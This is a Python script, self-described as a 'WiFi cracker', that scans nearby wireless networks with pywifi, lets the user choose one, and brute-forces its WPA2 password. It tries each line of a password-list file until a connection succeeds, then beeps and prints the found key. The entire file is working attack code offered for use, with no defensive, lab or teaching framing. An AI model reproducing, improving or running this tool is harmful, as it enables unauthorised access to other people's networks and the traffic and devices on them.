from pywifi import const, PyWiFi, Profile
from threading import Thread
from termcolor import cprint
from itertools import cycle
from winsound import Beep
from time import sleep
from sys import stdout
import os

def scan():
    interface.scan()
    for i in range(52):
        sleep(.15)
        stdout.write(f'\r Scanning... {next(loading_chars)}')
        
    result = interface.scan_results()
    
    return result

def testwifi(ssid , password):
    interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.connect(interface.add_network_profile(profile))
    sleep(.7)
    
    if interface.status() == const.IFACE_CONNECTED:
        interface.remove_network_profile(profile)
        return True
    
    else:
        interface.remove_network_profile(profile)
        return False
        
    
os.system('cls')        

wifi = PyWiFi()
interface = wifi.interfaces()[0]
loading_chars = iter(cycle('/-\|'))
colors = iter(cycle(['blue', 'red']))
password_list = "password-list.txt"

sleep(.5)
print('\n Welcome to WiFi cracker(written by Sina.f)\n')
sleep(1)

hosts = scan()
hosts = [host.ssid for host in hosts]

if hosts:
    print('\n')
    for idx, host in enumerate(hosts, 1):
        sleep(1)
        print(f' {idx}_ {host}')
        
    sleep(1)
    selected_host = input("\n Select a host to start cracking: ")

    while True:
        try:
            selected_host = int(selected_host)
            assert selected_host <= len(hosts) and selected_host > 0
            selected_host -= 1
            break
        
        except AssertionError:
            print(f'\n "{selected_host}" is not a valid host number')
            selected_host = input('\n Please enter a valid host: ')
        
        except:
            if selected_host in hosts:
                selected_host = hosts.index(selected_host)
                break
            
            else:
                print(f'\n "{selected_host}" is not a valid host name')
                selected_host = input('\n Please enter a valid host: ')
            
    target = hosts[selected_host]
    tests = 0
    print()
    
    with open(os.path.realpath(password_list)) as passlist:
        for password in passlist.readlines():
            if len(password) < 8:
                continue
            
            color = next(colors)
            cprint(f' Testing: {password}', color=color)
            tests += 1
            
            if testwifi(target , password):
                Beep(700 , 500)
                Beep(1000 , 500) 
                print()
                print(format(' ', '-<30'))
                # print('\n', format(' ', '-<30'), sep='')
                cprint(f' PASSWORD: {password}', color='green')
                print(f' {tests} Password tested!')
                print(format(' ', '-<30'))
                break

else:
    print('\n\n No WiFi available!\n')

   
figlet =  '''\n
   _____ _                __ 
  / ____(_)              / _|
 | (___  _ _ __   __ _  | |_ 
  \___ \| | '_ \ / _` | |  _|
  ____) | | | | | (_| |_| |  
 |_____/|_|_| |_|\__,_(_)_| 
\n\n'''

for line in figlet.splitlines():
    print(line)
    sleep(.2)

sleep(1)
input(' Press enter to exit...')   